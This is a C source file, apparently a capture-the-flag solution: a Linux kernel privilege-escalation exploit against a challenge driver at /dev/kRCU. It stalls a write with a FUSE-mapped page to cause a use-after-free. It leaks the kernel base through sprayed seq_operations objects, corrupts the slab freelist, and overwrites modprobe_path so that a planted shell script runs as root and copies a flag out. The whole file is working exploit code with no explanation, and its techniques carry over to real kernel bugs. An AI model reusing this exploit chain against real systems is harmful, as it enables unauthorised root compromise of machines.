#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <syscall.h>

#include <fuse.h>

#define PAGESZ 0x1000

#define DEVNAME "/dev/kRCU"
#define FUSE_PATH "./a/"
#define SEQ_OPS_N 0x20

#define ALLOCATE  0x1337000
#define SETRWPTR  0x1337001
#define DELETE    0x1337002
#define READ      0x1337003
#define WRITE     0x1337004

#define KADDR(x) kbase+(x-0xffffffff81000000)

struct arg {
  union {
    uint32_t idx;
    void* ptr;
  };
  size_t size;
};

int p[2];

int fd = -1;
void* addr;
int file_size = 0x10000;
int seq_ops[0x100];
uint64_t kbase = 0;

void log_err(const char *format, ...)
{
    if (!format) {
        exit(EXIT_FAILURE);
    }

    fprintf(stderr, "%s", "[-] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "\n");
    fflush(stderr);

    exit(EXIT_FAILURE);
}

#define SAFE(result) \
({ \
    typeof(result) _r = (result); \
    if (_r < 0) log_err("%s:%d: returned %p", __FILE__, __LINE__, _r); \
    _r; \
});

void debug() {
	printf("Debug\n");
    getchar();
}

// Pin thread to a cpu
// @param cpu: cpu id
void pin_thread(int cpu){
    cpu_set_t cs;

    CPU_ZERO(&cs);
    CPU_SET(cpu, &cs);
    if (sched_setaffinity(gettid(), sizeof(cs), &cs))
        log_err("sched_setaffinity");
}

// Examine memory as unsigned long list
// @param buffer: memory address
// @param n: number of elements to print
void examine(void* buffer, int n){
    // buffer = (uint64_t*)buffer;
    fprintf(stderr, "========================= EXAMINE =========================\n");
    for (int i = 0; i < n; i++){
        fprintf(stderr, "[%04x] 0x%016lx\n", i*8, ((uint64_t*)buffer)[i]);
    }
}

// ===================================================================================
// fuse stuff

static int hello_getattr(const char *path, struct stat *stbuf)
{
    int res = 0;
    memset(stbuf, 0, sizeof(struct stat));
    if (strcmp(path, "/") == 0) {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    } else if (strcmp(path, "/ctf") == 0) {
        stbuf->st_mode = S_IFREG | 0666;
        stbuf->st_nlink = 1;
        stbuf->st_size = file_size;
        stbuf->st_blocks = 0;
    } 
    else
        res = -2;
    return res;
}

static int hello_open(const char *path, int options) {
    return 0;
}

static int hello_read(const char *path, char *buf, size_t size, off_t offset) 
{
	pin_thread(1);
	char payload[0x20] = {0};
	read(p[0], &payload, 0x20);

	memcpy(buf, &payload, 0x20);
    return size; 
}

static struct fuse_operations hello_ops = {
    .getattr    = hello_getattr,
    .open       = hello_open,
    .read       = hello_read
};

// ===================================================================================
int allocate(uint32_t idx, size_t size) {
	struct arg arg = {
		.idx = idx,
		.size = size
	};

	return SAFE(ioctl(fd, ALLOCATE, &arg));
}

int set_rwnote(uint32_t idx) {
	struct arg arg = {
		.idx = idx,
		.size = 0
	};

	return SAFE(ioctl(fd, SETRWPTR, &arg));
}

int readNote(void* buffer, size_t size) {
	struct arg arg = {
		.ptr = buffer,
		.size = size
	};

	return SAFE(ioctl(fd, READ, &arg));
}

int writeNote(void* buffer, size_t size) {
	struct arg arg = {
		.ptr = buffer,
		.size = size
	};

	return SAFE(ioctl(fd, WRITE, &arg));
}

int delete(uint32_t idx) {
	struct arg arg = {
		.idx = idx,
		.size = 0
	};

	return SAFE(ioctl(fd, DELETE, &arg));
}

void _setup_fuse() {
	if (fork() == 0) {
		prctl(PR_SET_NAME, "fuseDmon", 0, 0, 0);

		system("cd /tmp && mkdir " FUSE_PATH);
		
		pin_thread(1);
		
		int argc = 2;
		char *argv[] = {
			"/tmp/exploit",
			FUSE_PATH,
			NULL
		};

		close(p[1]);	// close write end
		SAFE(fuse_main(argc, argv, &hello_ops));
	}
}

void write_after_free() {
	printf("Blocking write\n");
	writeNote(addr, 0x20);
}

void alloc_seq_ops(int i) {
	seq_ops[i] = SAFE(open("/proc/self/stat", O_RDONLY));
}

void free_seq_ops(int i) {
	SAFE(close(seq_ops[i]));
}

void prepare(){
    /* prepare modproble_path exploitation */
    system("echo -ne '#!/bin/sh\ncat /dev/vdc > /tmp/flag' > /tmp/loooooooooooooooooooooooong");
    system("chmod +x /tmp/loooooooooooooooooooooooong");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/x");
    system("chmod +x /tmp/x");
}

int main(int argc, char* argv[], char* envp[]) {
	pthread_t t1, t2, t3, t4;

	// initial setup
	pipe(p);
	prepare();
	pin_thread(1);

	// initialize fuse filesystem
	_setup_fuse();
	sleep(1);

	// map file from fusefs
	int fuse_fd = SAFE(open(FUSE_PATH "/ctf", O_RDWR));
	printf("[+] Opened fuse file at fd %d\n", fuse_fd);
	addr = SAFE(mmap((void*)0x1337000, PAGESZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED, fuse_fd, 0));
	printf("[+] fuse mmap addr: %p\n", addr);
	
	// open device driver
	fd = SAFE(open(DEVNAME, O_RDONLY));
	printf("[+] Opened device at fd %d\n", fd);


	// ======================= leak kernel base
	uint64_t leaks[4];

	// spray seq operations
	for (int i = 0; i < SEQ_OPS_N; ++i) alloc_seq_ops(i);
	free_seq_ops(0);

	// leak kernel text base
	allocate(0xf, 0x20);
	set_rwnote(0xf);
	readNote(&leaks, 0x20);

	// examine(leaks, 4);
	kbase = leaks[0] - (0xffffffff81290c90 - 0xffffffff81000000);
	printf("[+] kbase: %p\n", kbase);
	printf("[+] modprobepath: %p\n", KADDR(0Xffffffff82a4db70));


	// ====================== get rip control
	// prepare for uaf
	allocate(0, 0x20);
	allocate(1, 0x20);
	set_rwnote(0);

	// pause write operation
	pthread_create(&t2, NULL, (void * (*)(void *))&write_after_free, NULL);
	sleep(1);

	// free the object
	set_rwnote(1);
	delete(0);
	// modprobe 0Xffffffff82a4db70

	// resume write operation
	uint64_t payload[4] = {1,2,KADDR(0Xffffffff82a4db70),4};
	write(p[1], payload, 0x20);

	sleep(1);
	allocate(2, 0x20);

	sleep(1);
	allocate(3, 0x20);
	
	// hijack freelist and point it to modprobepath
	set_rwnote(3);
	writeNote("/tmp/loooooooooooooooooooooooong", 0x20);

	// crash, copy flag to /tmp
	system("/tmp/x");

	pthread_join(t2, NULL);
	return 0;
}